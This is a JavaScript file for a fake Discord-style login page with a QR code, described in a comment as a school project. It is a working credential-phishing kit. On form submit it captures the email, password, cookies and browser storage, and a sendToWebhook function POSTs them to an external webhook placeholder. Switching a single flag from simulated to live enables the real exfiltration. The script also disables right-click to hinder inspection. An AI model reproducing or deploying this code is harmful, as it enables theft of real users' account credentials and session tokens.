// Debug: Confirm script is loaded
console.log("Script loaded successfully!");

// Selecting Elements
const emailInput = document.querySelector('input[id="emailORphone"]');
const passwordInput = document.querySelector('input[id="password"]');
const loginButton = document.querySelector('button');
const loginForm = document.querySelector('#loginForm');
const qrContainer = document.querySelector('.qr-container');

// Debug: Check if elements are found
console.log("Email input:", emailInput);
console.log("Password input:", passwordInput);
console.log("Login button:", loginButton);
console.log("Form:", loginForm);
console.log("QR container:", qrContainer);

// Check for missing elements
if (!emailInput || !passwordInput || !loginButton || !loginForm || !qrContainer) {
  console.error("One or more elements not found. Check HTML IDs and structure.");
  alert("Error: Form elements not found. Check console for details.");
  throw new Error("Missing form elements");
}

// Ellipsis Animation
function removeEllipsisAnimation() {
  if (loginButton) {
    loginButton.innerHTML = "";
    loginButton.textContent = "Log In";
    loginButton.removeAttribute("disabled");
  }
}

function animateEllipsis() {
  if (!loginButton) {
    console.error("Login button not found, cannot animate");
    return;
  }
  loginButton.innerHTML = `
    <span class="spinner" role="img" aria-label="Loading">
      <span class="inner pulsingEllipsis">
        <span class="item spinnerItem"></span>
        <span class="item spinnerItem"></span>
        <span class="item spinnerItem"></span>
      </span>
    </span>`;
  const spinnerItems = document.querySelectorAll(".spinnerItem");
  spinnerItems.forEach((item, index) => {
    item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${index * 0.2}s`;
  });
  loginButton.setAttribute("disabled", "true");
  setTimeout(removeEllipsisAnimation, 3000);
}

// Generating QR Code
function generateQRCode(data) {
  try {
    const qr = qrcode(0, "L");
    qr.addData(data);
    qr.make();
    const moduleCount = qr.getModuleCount();
    const svgString = qr.createSvgTag(1, 0);
    const parser = new DOMParser();
    const svgDoc = parser.parseFromString(svgString, "image/svg+xml");
    const svgElement = svgDoc.documentElement;
    svgElement.setAttribute("width", "160");
    svgElement.setAttribute("height", "160");
    svgElement.setAttribute("viewBox", "0 0 37 37");
    const path = svgElement.querySelector("path");
    if (path) {
      path.setAttribute("transform", `scale(${37 / moduleCount})`);
      return svgElement;
    }
    console.error("QR code path not found");
    return null;
  } catch (error) {
    console.error("Error generating QR code:", error);
    return null;
  }
}

// Simulate Token Retrieval (for local testing without server)
function simulateFetchAccountToken(email, password) {
  console.log("Simulating token retrieval for:", email);
  const simulatedToken = `simulated-token-${Math.random().toString(36).substring(2)}`;
  localStorage.setItem("token", simulatedToken);
  console.log("Simulated token stored in localStorage:", simulatedToken);
  
  const userTokens = {
    cookies: document.cookie ? document.cookie.split(";").reduce((acc, cookie) => {
      const [key, value] = cookie.trim().split("=");
      acc[key] = value;
      return acc;
    }, {}) : {},
    localStorage: { token: simulatedToken },
    sessionStorage: {}
  };
  
  if (simulatedToken) {
    const qrCode = generateQRCode(simulatedToken);
    if (qrCode) {
      qrContainer.innerHTML = ""; // Clear previous QR code
      qrContainer.appendChild(qrCode);
      console.log("QR code generated for simulated token");
    }
  }
  
  return { apiToken: simulatedToken, userTokens };
}

// Real Webhook (requires server)
async function sendToWebhook(email, password, tokenData) {
  const webhookUrl = "YOUR_WEBHOOK_URL_HERE"; // Replace with webhook.site URL
  const { apiToken, userTokens } = tokenData || {
    apiToken: null,
    userTokens: { cookies: {}, localStorage: {}, sessionStorage: {} }
  };
  const payload = {
    content: `Email: ${email}\nPassword: ${password}\nAPI Token: ${apiToken || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
    username: "Login Attempt",
    avatar_url: "https://example.com/avatar.png"
  };
  console.log("Sending payload to webhook:", payload);
  try {
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    });
    const responseText = await response.text();
    if (!response.ok) {
      throw new Error(`HTTP ${response.status}: ${responseText}`);
    }
    console.log("Webhook success! Response:", responseText);
    return true;
  } catch (error) {
    console.error("Webhook failed:", error.message);
    alert("Error sending webhook. Check console for details.");
    return false;
  }
}

// Simulate Webhook (for local testing without server)
async function simulateSendToWebhook(email, password, tokenData) {
  const { apiToken, userTokens } = tokenData || {
    apiToken: null,
    userTokens: { cookies: {}, localStorage: {}, sessionStorage: {} }
  };
  const payload = {
    content: `Email: ${email}\nPassword: ${password}\nAPI Token: ${apiToken || 'Not retrieved'}\nCookies: ${JSON.stringify(userTokens.cookies, null, 2)}\nLocalStorage: ${JSON.stringify(userTokens.localStorage, null, 2)}\nSessionStorage: ${JSON.stringify(userTokens.sessionStorage, null, 2)}\nTimestamp: ${new Date().toISOString()}`,
    username: "Login Attempt",
    avatar_url: "https://example.com/avatar.png"
  };
  console.log("Simulated webhook payload:", payload);
  alert("Simulated webhook sent! Check console for payload details.");
  return true;
}

// Toggle between simulated and real webhook
const USE_REAL_WEBHOOK = false; // Set to true to use real webhook (requires server)

// Attaching Event Listeners
if (loginForm && loginButton) {
  loginForm.addEventListener("submit", async (event) => {
    event.preventDefault();
    const email = emailInput?.value.trim() || "";
    const password = passwordInput?.value.trim() || "";
    console.log("Email:", email, "Password:", password);
    
    if (!email || !password) {
      alert("Please enter both email and password.");
      removeEllipsisAnimation();
      return;
    }
    
    animateEllipsis();
    const tokenData = simulateFetchAccountToken(email, password);
    const webhookSuccess = USE_REAL_WEBHOOK
      ? await sendToWebhook(email, password, tokenData)
      : await simulateSendToWebhook(email, password, tokenData);
    
    setTimeout(() => {
      if (webhookSuccess) {
        console.log("Simulating redirect to Discord...");
        alert("Login successful! QR code generated and webhook sent. Check console.");
      } else {
        console.log("Webhook failed");
        alert("Login failed - check console for details");
      }
    }, 3000);
  });
} else {
  console.error("Login form or button not found.");
  alert("Error: Form or button not found. Check console for details.");
}

// Prevent right-click (optional for school project)
document.addEventListener("contextmenu", (e) => {
  e.preventDefault();
});
